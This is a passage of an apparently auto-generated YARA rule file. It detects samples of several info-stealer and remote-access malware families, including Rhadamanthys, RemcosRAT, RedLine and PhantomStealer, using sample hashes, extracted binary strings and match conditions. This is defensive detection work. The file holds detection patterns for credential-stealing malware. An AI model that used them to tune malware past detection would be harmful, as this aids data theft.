      hash2 = "01916ef7e76245caac102dbb505ad4aebc28b7f1de7d7c311f31585d17cb6551"
      hash3 = "c9b7aa7a67392dd4537f636d4791e75984d3862280c301c9ca0f91424f64972c"
   strings:
      $x1 = "System.Diagnostics.Design.ProcessDesigner, System.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" fullword ascii /* score: '32.00'*/
      $x2 = "System.Diagnostics.Design.ProcessModuleDesigner, System.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3" ascii /* score: '32.00'*/
      $s3 = "DeleteTimerXSystem.Threading.IThreadPoolWorkItem.Execute" fullword ascii /* score: '25.00'*/
      $s4 = "System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e0892ArrayListEnumeratorSimple" fullword ascii /* score: '24.00'*/
      $s5 = "System, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '24.00'*/
      $s6 = "BSystem.Collections.Concurrent.dll:System.Collections.NonGeneric" fullword ascii /* score: '22.00'*/
      $s7 = "BTransitionToCancellationRequested.ExecuteCallbackHandlers" fullword ascii /* score: '21.00'*/
      $s8 = "\"GetCurrentProcess" fullword ascii /* score: '20.00'*/
      $s9 = "System.Runtime.CompilerServices.IStateMachineBoxAwareAwaiter.AwaitUnsafeOnCompleted@" fullword ascii /* score: '20.00'*/
      $s10 = "&GetProcessShortName" fullword ascii /* score: '20.00'*/
      $s11 = "$GetExitCodeProcess" fullword ascii /* score: '20.00'*/
      $s12 = " OpenProcessToken" fullword ascii /* score: '18.00'*/
      $s13 = "`<EnsureThreadPoolBindingInitialized>g__Init|24_0P<GetFileLength>g__GetFileLengthCore|28_0 __GetFieldHelper@" fullword ascii /* score: '15.00'*/
      $s14 = "rSystem.Threading.Tasks.Sources.IValueTaskSource.GetResult@" fullword ascii /* score: '15.00'*/
      $s15 = " ExecutionContext(IOCompletionCallback" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 26000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _RustyStealer_signature__1c933dd44902e01b2ff610e71216aeb0_imphash__RustyStealer_signature__a8ebd0d0bf42e700555831b3ceed18e4__68 {
   meta:
      description = "_subset_batch - from files RustyStealer(signature)_1c933dd44902e01b2ff610e71216aeb0(imphash).exe, RustyStealer(signature)_a8ebd0d0bf42e700555831b3ceed18e4(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ec0249a82e80a8856f4d50b537075f67f88a392ce20bb5fbaa18f0f069d91cd9"
      hash2 = "cdc73afb92617d9e2e0b6f2f22587f5f57316250a25b7bb8477a80628703e7b7"
   strings:
      $s1 = "(SSL.com Root Certification Authority RSA0" fullword ascii /* score: '16.00'*/
      $s2 = "t have a host to setURLs more than 4 GB are not supportedEmptyHostIdnaErrorInvalidPortInvalidIpv4AddressInvalidIpv6AddressInvali" ascii /* score: '15.00'*/
      $s3 = "GOAWAY stream IDs shouldn't be higher; last_processed_id = , f.last_stream_id() = " fullword ascii /* score: '15.00'*/
      $s4 = "authority implies host" fullword ascii /* score: '14.00'*/
      $s5 = "attempted to index slice up to maximum usize" fullword ascii /* score: '13.00'*/
      $s6 = "invalid uri characterinvalid schemeinvalid authorityinvalid portinvalid formatscheme missingauthority missingpath missinguri too" ascii /* score: '12.00'*/
      $s7 = "invalid URL, scheme is not httpinvalid URL, scheme is missinginvalid URL, host is missingConnectError" fullword ascii /* score: '12.00'*/
      $s8 = "assertion failed: !header.is_sensitive()" fullword ascii /* score: '12.00'*/
      $s9 = "has_authority means set_username shouldn't fail" fullword ascii /* score: '10.00'*/
      $s10 = "HandleCompletionPortAfdGroupcpafd_group" fullword ascii /* score: '10.00'*/
      $s11 = "BorrowErrorBorrowMutErroralready borrowed: " fullword ascii /* score: '10.00'*/
      $s12 = "assertion failed: val <= frame::MAX_MAX_FRAME_SIZE as usize" fullword ascii /* score: '10.00'*/
      $s13 = "connection closed because of a broken pipeassertion failed: sz <= super::MAX_WINDOW_SIZE as usize" fullword ascii /* score: '9.00'*/
      $s14 = " - = M ] k y " fullword ascii /* score: '9.00'*/
      $s15 = "keep-aliveHTTP/1.1 100 Continue" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 19000KB and ( 8 of them )
      ) or ( all of them )
}

rule _PureLogsStealer_signature__335c1198_RemcosRAT_signature__25b59cda_RemcosRAT_signature__8094ed89_RemcosRAT_signature__ba7336_69 {
   meta:
      description = "_subset_batch - from files PureLogsStealer(signature)_335c1198.xlsx, RemcosRAT(signature)_25b59cda.xlsx, RemcosRAT(signature)_8094ed89.xlsx, RemcosRAT(signature)_ba7336e6.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "335c1198739b316112714ac01ce5e4fd62ab3323157f8a4b4fea3568a1d7639e"
      hash2 = "25b59cda4893aea607cbc3ab11a1d7b85a72f350c4d66bad81ccd8ab851bfcd9"
      hash3 = "8094ed89d3a8a75dc4894556a4547f15474293d540e82288528d138ca752bed3"
      hash4 = "ba7336e6a3975db8ce0f808c30c5f896ee8fcb2578e060fe1523f4ce74e6abf6"
   strings:
      $x1 = "<xsd:schema targetNamespace=\"http://schemas.microsoft.com/office/2006/metadata/properties\" ma:root=\"true\" ma:fieldsID=\"d35e" ascii /* score: '32.00'*/
      $s2 = "<xsd:schema targetNamespace=\"http://schemas.microsoft.com/sharepoint/v3\" elementFormDefault=\"qualified\" xmlns:xsd=\"http://w" ascii /* score: '30.00'*/
      $s3 = "<xsd:schema targetNamespace=\"http://schemas.microsoft.com/sharepoint/v3\" elementFormDefault=\"qualified\" xmlns:xsd=\"http://w" ascii /* score: '30.00'*/
      $s4 = "<xsd:schema targetNamespace=\"http://schemas.microsoft.com/office/2006/metadata/properties\" ma:root=\"true\" ma:fieldsID=\"d35e" ascii /* score: '30.00'*/
      $s5 = "<xsd:schema targetNamespace=\"http://schemas.openxmlformats.org/package/2006/metadata/core-properties\" elementFormDefault=\"qua" ascii /* score: '27.00'*/
      $s6 = "<xsd:import namespace=\"http://schemas.microsoft.com/sharepoint/v3\"/>" fullword ascii /* score: '23.00'*/
      $s7 = "mas.microsoft.com/sharepoint/v3\"/><ds:schemaRef ds:uri=\"http://schemas.microsoft.com/office/2006/documentManagement/types\"/><" ascii /* score: '23.00'*/
      $s8 = "purl.org/dc/elements/1.1/\" xmlns:dcterms=\"http://purl.org/dc/terms/\" xmlns:odoc=\"http://schemas.microsoft.com/office/interna" ascii /* score: '20.00'*/
      $s9 = "/metadata/properties\" xmlns:ns1=\"http://schemas.microsoft.com/sharepoint/v3\">" fullword ascii /* score: '20.00'*/
      $s10 = "<xsd:schema targetNamespace=\"http://schemas.openxmlformats.org/package/2006/metadata/core-properties\" elementFormDefault=\"qua" ascii /* score: '20.00'*/
      $s11 = "<xsd:import namespace=\"http://schemas.microsoft.com/office/2006/documentManagement/types\"/>" fullword ascii /* score: '20.00'*/
      $s12 = "ntentTypeScope=\"\" ma:versionID=\"847d1637c6790715f687a04f581c5d08\" xmlns:ct=\"http://schemas.microsoft.com/office/2006/metada" ascii /* score: '19.00'*/
      $s13 = "ID=\"0x01010049A41B3530BF48DD9EA7B85E78DB3B5D\" ma:contentTypeVersion=\"1\" ma:contentTypeDescription=\"Create a new document.\"" ascii /* score: '18.00'*/
      $s14 = "2006/customXml\"><ds:schemaRefs><ds:schemaRef ds:uri=\"http://schemas.microsoft.com/office/2006/metadata/longProperties\"/></ds:" ascii /* score: '17.00'*/
      $s15 = "LSchema\"/><ds:schemaRef ds:uri=\"http://schemas.microsoft.com/office/2006/metadata/properties\"/><ds:schemaRef ds:uri=\"http://" ascii /* score: '17.00'*/
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 4000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__9cbefe68f395e67356e2a5d8d1b285c0_imphash__694ace6e_Rhadamanthys_signature__9cbefe68f395e67356e2a5d8_70 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_694ace6e.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_71f4b177.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_a14ca283.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_aaa80a57.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_bb3b307d.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_c2d5e6e9.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_f5139fc2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "694ace6efcabaf0ba32a66581b6e710bf432761f18984891a78b5377109d7ef9"
      hash2 = "71f4b177ab5dbf844397591deda7cbb750b4fc3dda07c10f41ee3d7615278976"
      hash3 = "a14ca283ce205cbc9c1ca540cdfc17ff62e28557de5fa1eedfdddfdd4456b27e"
      hash4 = "aaa80a57fa8ecfcdcec28fec4b338eb015925e2e2b57b4aa910d559bce58199c"
      hash5 = "bb3b307d85e0e4c237c2e2ddd4222f7a93cf769c9064c08cba0940d44d62436a"
      hash6 = "c2d5e6e925c2450d4d5d8cba94c7570049a4da43647165fe9db23e009c977f91"
      hash7 = "f5139fc2fa5525e89dde9d4d8ccf522bf60a7990fa0e213218a11d1f23c2d7ee"
   strings:
      $x1 = " to unallocated spanCertOpenSystemStoreWCreateProcessAsUserWCryptAcquireContextWGetAcceptExSockaddrsGetCurrentDirectoryWGetFileA" ascii /* score: '50.00'*/
      $x2 = "slice bounds out of range [:%x] with length %ystopTheWorld: not stopped (status != _Pgcstop)sysGrow bounds not aligned to palloc" ascii /* score: '50.00'*/
      $x3 = "<asmv3:application xmlns:asmv3=\"urn:schemas-microsoft-com:asm.v3\"><asmv3:windowsSettings xmlns=\"http://schemas.microsoft.com/" ascii /* score: '48.00'*/
      $x4 = "object is remotereflect mismatchremote I/O errorruntime:  g:  g=runtime: addr = runtime: base = runtime: gp: gp=runtime: head = " ascii /* score: '46.00'*/
      $x5 = "lock: lock countslice bounds out of rangesocket type not supportedstartm: p has runnable gsstoplockedm: not runnableunexpected f" ascii /* score: '44.00'*/
      $x6 = "GetAddrInfoWGetLastErrorGetLengthSidGetStdHandleGetTempPathWLoadLibraryWReadConsoleWResumeThreadSetEndOfFileTransmitFileVirtualA" ascii /* score: '44.00'*/
      $x7 = "file descriptor in bad statefindrunnable: netpoll with pfound pointer to free objectgcBgMarkWorker: mode not setgcstopm: negativ" ascii /* score: '43.00'*/
      $x8 = " to non-Go memory , locked to threadCommandLineToArgvWCreateFileMappingWGetExitCodeProcessGetFileAttributesWLookupAccountNameWRF" ascii /* score: '42.00'*/
      $x9 = ".lib section in a.out corruptedbad write barrier buffer boundscall from within the Go runtimecannot assign requested addresscasg" ascii /* score: '41.50'*/
      $x10 = "Go pointer stored into non-Go memoryUnable to determine system directoryaccessing a corrupted shared libraryruntime: VirtualQuer" ascii /* score: '41.00'*/
      $x11 = "unknown pcws2_32.dll  of size   (targetpc= , plugin:  KiB work,  exp.) for  freeindex= gcwaiting= idleprocs= in status  mallocin" ascii /* score: '38.00'*/
      $x12 = "entersyscallgcBitsArenasgcpacertraceharddecommithost is downillegal seekinvalid slotiphlpapi.dllkernel32.dlllfstack.pushmadvdont" ascii /* score: '36.00'*/
      $x13 = "garbage collection scangcDrain phase incorrectindex out of range [%x]interrupted system callinvalid m->lockedInt = left over mar" ascii /* score: '35.00'*/
      $s14 = "ionPortGetEnvironmentStringsWGetTimeZoneInformationRtlGetNtVersionNumbersaddress already in useadvapi32.dll not foundargument li" ascii /* score: '30.00'*/
      $s15 = " is currently not supported for use in system callbackscasfrom_Gscanstatus:top gp->status is not in scan stategentraceback callb" ascii /* score: '30.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 8000KB and pe.imphash() == "9cbefe68f395e67356e2a5d8d1b285c0" and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__Rhadamanthys_signature__9cbefe68f395e67356e2a5d8d1b285c0__71 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d99f5dd0.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "769de98d15369885e5dd8dac76722a72cab4999c4b6b70b5b111f6735399ce52"
      hash2 = "1c135fa1f43b3d884d9f826f9f4eb3895d9976609661a9d1e60e0752b938572c"
      hash3 = "d99f5dd0397a316ee7d28af1e8f5e5c558cacf00d3d21b10ef8135c94c9e3034"
   strings:
      $s1 = "152587890625762939453125Bidi_ControlErrUnknownPCGetAddrInfoWGetConsoleCPGetLastErrorGetLengthSidGetStdHandleGetTempPathWJoin_Con" ascii /* score: '22.00'*/
      $s2 = "uireContextWEgyptian_HieroglyphsGetAcceptExSockaddrsGetAdaptersAddressesGetCurrentDirectoryWGetFileAttributesExWGetProcessMemory" ascii /* score: '20.00'*/
      $s3 = "fmt.complexError" fullword ascii /* score: '17.00'*/
      $s4 = "internal/syscall/windows.procGetProcessMemoryInfo" fullword ascii /* score: '16.00'*/
      $s5 = "os.ErrProcessDone" fullword ascii /* score: '15.00'*/
      $s6 = "1907348632812595367431640625CertCloseStoreCreateProcessWCryptGenRandomFindFirstFileWFormatMessageWGC assist waitGC worker initGe" ascii /* score: '15.00'*/
      $s7 = " to unallocated span37252902984619140625Arabic Standard TimeAzores Standard TimeCertOpenSystemStoreWCreateProcessAsUserWCryptAcq" ascii /* score: '14.00'*/
      $s8 = "internal/syscall/windows.procNetUserGetLocalGroups" fullword ascii /* score: '14.00'*/
      $s9 = "bytes.Buffer: reader returned negative count from ReadgcControllerState.findRunnable: blackening not enabledinternal error: poll" ascii /* score: '13.00'*/
      $s10 = "unicode.Khitan_Small_Script" fullword ascii /* score: '13.00'*/
      $s11 = "*pe.zeroReaderAt" fullword ascii /* score: '12.00'*/
      $s12 = "os/exec.go" fullword ascii /* score: '12.00'*/
      $s13 = "go.itab.debug/pe.zeroReaderAt,io.ReaderAt" fullword ascii /* score: '12.00'*/
      $s14 = "go.itab.*bytes.Reader,io.ReaderAt" fullword ascii /* score: '12.00'*/
      $s15 = "debug/pe.(*zeroReaderAt).ReadAt" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 11000KB and ( 8 of them )
      ) or ( all of them )
}

rule _PhantomStealer_signature__c9596ccdffde444fa435c5f9042f7548_imphash__PhantomStealer_signature__c9596ccdffde444fa435c5f9042f7_72 {
   meta:
      description = "_subset_batch - from files PhantomStealer(signature)_c9596ccdffde444fa435c5f9042f7548(imphash).exe, PhantomStealer(signature)_c9596ccdffde444fa435c5f9042f7548(imphash)_2a1dbc0f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e871bbb79c8b95b682d0d6870caeba86d70595ba711891abe6d210f38c79892b"
      hash2 = "2a1dbc0ffe84cdcbbfcf573609b9313cd3235ebabe66adf707c12d8b97d83568"
   strings:
      $s1 = "System.Runtime, Version=4.2.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a*ExceptionDispatchInfo:FirstChanceExceptionEven" ascii /* score: '27.00'*/
      $s2 = "System.Runtime, Version=4.2.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a*ExceptionDispatchInfo:FirstChanceExceptionEven" ascii /* score: '23.00'*/
      $s3 = "MoreLinq.dll" fullword ascii /* score: '23.00'*/
      $s4 = "RepositoryUrlPhttps://github.com/morelinq/MoreLINQ.git" fullword ascii /* score: '17.00'*/
      $s5 = " ExecutionContext,LockRecursionExceptiong" fullword ascii /* score: '16.00'*/
      $s6 = "add_ProcessExit@" fullword ascii /* score: '15.00'*/
      $s7 = "zSystem.Collections.Generic.IEnumerable<TResult>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s8 = "6ThrowNullReferenceExceptionVThrowNotSupportedException_UnwritableStream8ThrowObjectDisposedExceptionRThrowObjectDisposedExcepti" ascii /* score: '15.00'*/
      $s9 = "vSystem.Collections.Generic.IEnumerator<TResult>.get_Current@" fullword ascii /* score: '15.00'*/
      $s10 = "zSystem.Collections.Generic.IEnumerable<TSource>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s11 = "(IsWriteAtomicPrivateXSystem.Collections.Generic.IList<T>.get_Item" fullword ascii /* score: '15.00'*/
      $s12 = ".DataMisalignedException*DivideByZeroException(DllNotFoundException" fullword ascii /* score: '13.00'*/
      $s13 = "Unsafe&DllImportSearchPath" fullword ascii /* score: '12.00'*/
      $s14 = "*GetBytesForSmallInput,GetStringForSmallInput\\<GetMaxByteCount>g__ThrowArgumentException|7_0\\<GetMaxCharCount>g__ThrowArgument" ascii /* score: '12.00'*/
      $s15 = "GetComparer@" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 25000KB and pe.imphash() == "c9596ccdffde444fa435c5f9042f7548" and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__1aae8bf580c846f39c71c05898e57e88_imphash__Rhadamanthys_signature__9cbefe68f395e67356e2a5d8d1b285c0__73 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_1aae8bf580c846f39c71c05898e57e88(imphash).exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_694ace6e.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_71f4b177.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_a14ca283.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_aaa80a57.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_bb3b307d.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_c2d5e6e9.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d99f5dd0.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_f5139fc2.exe, Rhadamanthys(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, Rhadamanthys(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash)_984f14e5.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2fa08478b989da7327bcb2c22eefc626126d357de831b8182474ba1ac6240033"
      hash2 = "1c135fa1f43b3d884d9f826f9f4eb3895d9976609661a9d1e60e0752b938572c"
      hash3 = "694ace6efcabaf0ba32a66581b6e710bf432761f18984891a78b5377109d7ef9"
      hash4 = "71f4b177ab5dbf844397591deda7cbb750b4fc3dda07c10f41ee3d7615278976"
      hash5 = "a14ca283ce205cbc9c1ca540cdfc17ff62e28557de5fa1eedfdddfdd4456b27e"
      hash6 = "aaa80a57fa8ecfcdcec28fec4b338eb015925e2e2b57b4aa910d559bce58199c"
      hash7 = "bb3b307d85e0e4c237c2e2ddd4222f7a93cf769c9064c08cba0940d44d62436a"
      hash8 = "c2d5e6e925c2450d4d5d8cba94c7570049a4da43647165fe9db23e009c977f91"
      hash9 = "d99f5dd0397a316ee7d28af1e8f5e5c558cacf00d3d21b10ef8135c94c9e3034"
      hash10 = "f5139fc2fa5525e89dde9d4d8ccf522bf60a7990fa0e213218a11d1f23c2d7ee"
      hash11 = "5a68af44b9399b0bf6e41e5d60b994251dedb610c700dcfd81198b67a0518d0e"
      hash12 = "984f14e5ffd9a1a2c5f6c1015b8b42cf2eab941e1bcccb2b176736b7ac8bebbb"
   strings:
      $s1 = "runtime.buildVersion.str" fullword ascii /* score: '16.00'*/
      $s2 = "runtime.overrideWrite" fullword ascii /* score: '15.00'*/
      $s3 = "runtime.gcPaceSweeper" fullword ascii /* score: '15.00'*/
      $s4 = "runtime.gfget.func2" fullword ascii /* score: '15.00'*/
      $s5 = "runtime.(*activeSweep).end" fullword ascii /* score: '15.00'*/
      $s6 = "runtime.sysReserveOS" fullword ascii /* score: '14.00'*/
      $s7 = "runtime.(*gcControllerState).commit" fullword ascii /* score: '14.00'*/
      $s8 = "runtime.sysUnusedOS" fullword ascii /* score: '14.00'*/
      $s9 = "targetCPUFraction" fullword ascii /* score: '14.00'*/
      $s10 = "runtime.sysFreeOS" fullword ascii /* score: '14.00'*/
      $s11 = "runtime.sysFaultOS" fullword ascii /* score: '14.00'*/
      $s12 = "runtime.sysAllocOS" fullword ascii /* score: '14.00'*/
      $s13 = "runtime.(*goroutineProfileStateHolder).CompareAndSwap" fullword ascii /* score: '14.00'*/
      $s14 = "runtime.sysUsedOS" fullword ascii /* score: '14.00'*/
      $s15 = "runtime.gcControllerCommit" fullword ascii /* score: '13.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 9000KB and ( 8 of them )
      ) or ( all of them )
}

rule _PhantomStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__5724dcb2_RedLineStealer_signature__f34d5f2d4577ed6d9cee_74 {
   meta:
      description = "_subset_batch - from files PhantomStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5724dcb2.exe, RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_bfa56bac.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "5724dcb24aebd5f4f949f2a39b393f0608257c50ddbe29b63cfde2e8432420a9"
      hash2 = "bfa56bac0f412f8f07e937e06963c97d4c8527a34e948b1f4ad4b67a40ecb6cd"
   strings:
      $s1 = "Executable files (*.exe)|*.exe|Dynamic Link Libraries (*.dll)|*.dll|Icon files (*.ico)|*.ico|Shortcut files (*.lnk)|*.lnk|All fi" wide /* score: '28.00'*/
      $s2 = "Select an executable, DLL, icon, or shortcut file" fullword wide /* score: '17.00'*/
      $s3 = "<x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Go XMP SDK 1.0\"><rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns" ascii /* score: '10.00'*/
      $s4 = "<x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Go XMP SDK 1.0\"><rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns" ascii /* score: '10.00'*/
      $s5 = "Portable Network Graphic (*.png)|*.png|All Files (*.*)|*.*" fullword wide /* score: '10.00'*/
      $s6 = "get_PreviousSelectedSaveFilter" fullword ascii /* score: '9.00'*/
      $s7 = "get_ShowBorderCheckBox_IsChecked" fullword ascii /* score: '9.00'*/
      $s8 = "get_PreviousSelectedOpenFilter" fullword ascii /* score: '9.00'*/
      $s9 = "get_PreviouslySelectedListItemName" fullword ascii /* score: '9.00'*/
      $s10 = "get_PreviousSaveFilePath" fullword ascii /* score: '9.00'*/
      $s11 = "get_PreviousFiles" fullword ascii /* score: '9.00'*/
      $s12 = "OperatorButton_Click" fullword ascii /* score: '9.00'*/
      $s13 = "get_PreviousOpenFilePath" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 4000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__cc8ee04d9f6a0812cc52d3cecac318d2_imphash__RemcosRAT_signature__dcd2b16697810507d442c9bf8a9e913a_imphas_75 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_cc8ee04d9f6a0812cc52d3cecac318d2(imphash).exe, RemcosRAT(signature)_dcd2b16697810507d442c9bf8a9e913a(imphash).exe, RemcosRAT(signature)_e791f8773bf0061740713805d84feea8(imphash).exe, Rhadamanthys(signature)_1cf0e310ff7ad39ecc43438ffa3a0bb9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3e2d372a69cc2489159da3251620c9f09f89a184a454b87a8c8382bb309333d9"
      hash2 = "c6499501e5e06658bb2353d8624de75952f86b0b44bb64ec0966ee1e8d97a7bf"
      hash3 = "cedcfe85d91b8e4cc835547efd2d7b761b4aad101f306435a925f708fbcf1037"
      hash4 = "dcdd29b2d64f816751cec2150be92711e46f67bc657dd930630616f658605cbb"
   strings:
      $s1 = "<InitializeUserDefaultUICultureLGetCultureNotSupportedExceptionMessage0CreateCultureInfoNoThrow" fullword ascii /* score: '15.00'*/
      $s2 = "Zget_RuntimeMethodCommonOfUninstantiatedMethod@" fullword ascii /* score: '15.00'*/
      $s3 = "Switch.System.Globalization.EnforceJapaneseEraYearRange" fullword wide /* score: '14.00'*/
      $s4 = "Switch.System.Globalization.FormatJapaneseFirstYearAsANumbe" fullword wide /* score: '14.00'*/
      $s5 = ",GetCurrentOneYearLocal,GetOneYearLocalFromUtc@" fullword ascii /* score: '13.00'*/
      $s6 = "get_Reader@" fullword ascii /* score: '12.00'*/
      $s7 = "(get_CurrentUICulture(set_CurrentUICulture0get_UserDefaultUICulture(get_InvariantCulture" fullword ascii /* score: '12.00'*/
      $s8 = "0get_MinSupportedDateTime0get_MaxSupportedDateTime$GetDefaultInstance" fullword ascii /* score: '12.00'*/
      $s9 = "XGetRuntimeGenericParameterTypeInfoForMethods" fullword ascii /* score: '12.00'*/
      $s10 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Time Zone" fullword wide /* score: '12.00'*/
      $s11 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Time Zones\\UT" fullword wide /* score: '12.00'*/
      $s12 = "*GetUserDefaultCulture.GetUserDefaultUICulture0GetUserDefaultLocaleName@" fullword ascii /* score: '11.00'*/
      $s13 = ".ComputeParametersString" fullword ascii /* score: '11.00'*/
      $s14 = "(TRuntimeMethodCommon" fullword ascii /* score: '10.00'*/
      $s15 = ">CompareAdjustmentRuleToDateTime@" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__d42595b695fc008ef2c56aabd8efd68e_imphash__Rhadamanthys_signature__d42595b695fc008ef2c56aabd8efd68e__76 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, Rhadamanthys(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash)_984f14e5.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "5a68af44b9399b0bf6e41e5d60b994251dedb610c700dcfd81198b67a0518d0e"
      hash2 = "984f14e5ffd9a1a2c5f6c1015b8b42cf2eab941e1bcccb2b176736b7ac8bebbb"
   strings:
      $s1 = "mCertCloseStoreCreateProcessWFindFirstFileWFormatMessageWGetConsoleModeProcess32NextWSetFilePointerNetUserGetInfoGetUserNameExWT" ascii /* score: '30.00'*/
      $s2 = "unsafe.String: len out of rangefmt: unknown base; can't happen11368683772161602973937988281255684341886080801486968994140625refl" ascii /* score: '26.50'*/
      $s3 = "WGetExitCodeProcessGetFileAttributesWSetFileAttributesWCommandLineToArgvWadaptivestackstartdontfreezetheworldtraceadvanceperiodt" ascii /* score: '23.00'*/
      $s4 = "c for 363797880709171295166015625abi.NewName: tag too long: httpservecontentkeepheadersreflect.Value.UnsafePointerfile descripto" ascii /* score: '23.00'*/
      $s5 = "exit hook invoked panicreflect.Value.Interfacereflect.Value.NumMethodGetSidSubAuthorityCountImpersonateLoggedOnUserDestroyEnviro" ascii /* score: '23.00'*/
      $s6 = "axpartsunknown type kindRegLoadMUIStringWoperation canceledno child processesconnection refusedRFS specific erroridentifier remo" ascii /* score: '22.00'*/
      $s7 = "nstallgoroothtml/templatetlsmaxrsasizeGetTempPath2WModule32NextWRtlGetVersionRegDeleteKeyWRegEnumValueWGetProcAddressfile too la" ascii /* score: '21.00'*/
      $s8 = "vedinput/output errormultihop attemptedfile name too longno locks availablestreams pipe errorLookupAccountNameWCreateFileMapping" ascii /* score: '20.00'*/
      $s9 = ": impossible type kindruntime.semasleep wait_failed45474735088646411895751953125GetVolumeInformationByHandleWsocket operation on" ascii /* score: '20.00'*/
      $s10 = "07917022705078125address family not supported by protocolfailure to read PE32 optional header: %vinvalid span in heapArena for u" ascii /* score: '18.00'*/
      $s11 = "+ after -): cannot exec a shared library directlyvalue too large for defined data typetoo many symbols; file may be corruptrunti" ascii /* score: '16.00'*/
      $s12 = "descriptionfile already existsfile does not existfile already closedbinary.LittleEndianreflect.Value.Floatreflect.Value.IsNil149" ascii /* score: '16.00'*/
      $s13 = "runtime.pinnerGetPtr" fullword ascii /* score: '15.00'*/
      $s14 = "runtime.getfp" fullword ascii /* score: '15.00'*/
      $s15 = "rgeis a directorylevel 2 haltedlevel 3 haltedtoo many linksno such deviceprotocol errortext file busytoo many usersCryptGenRando" ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 9000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 8 of them )
      ) or ( all of them )
}

